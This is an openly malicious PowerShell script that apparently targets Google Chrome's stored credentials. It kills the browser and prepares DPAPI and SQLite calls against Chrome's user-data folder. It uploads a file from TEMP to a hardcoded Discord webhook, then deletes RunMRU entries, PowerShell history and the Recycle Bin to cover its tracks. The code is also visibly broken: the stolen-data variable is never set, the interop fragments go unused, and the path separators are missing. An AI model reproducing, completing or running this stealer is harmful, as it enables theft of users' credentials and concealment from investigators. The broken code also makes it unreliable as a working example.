$FileName = "$env:USERNAME$_User-VJMI.txt"

Stop-Process -Name Chrome -ErrorAction SilentlyContinue

$d = Add-Type -ErrorAction Stop -PassThru -AssemblyName System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$z = "$env:LOCALAPPDATAGoogleChromeUser Data"
$u = [Security.Cryptography.ProtectedData]

$l | Out-File -FilePath "$env:TEMP$FileName" -Encoding UTF8

$pathToChrome = 'C:Program Files (x86)GoogleChromeApplicationchrome.exe'
Start-Process -FilePath $pathToChrome

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$false)]
        [string]$file,
        [parameter(Position=1, Mandatory=$false)]
        [string]$text
    )

    $hookurl = "https://discord.com/api/webhooks/1207392478848745542/2S-UVgHK5tfva-9f0wBCnyhkZ6lRVOEuoMRgpjoEaE-Wpg_PnGX1vZfn5gSnkzBr2Tgd"

    if (-not [string]::IsNullOrEmpty($text)){
        $Body = @{
            'username' = $env:username
            'content' = $text
        }
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)){
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not [string]::IsNullOrEmpty($FileName)){
    Upload-Discord -file "$env:TEMP$FileName"
}

Remove-Item -Path "HKCU:SoftwareMicrosoftWindowsCurrentVersionExplorerRunMRU" -Force -ErrorAction SilentlyContinue
Remove-Item -Path (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Exit
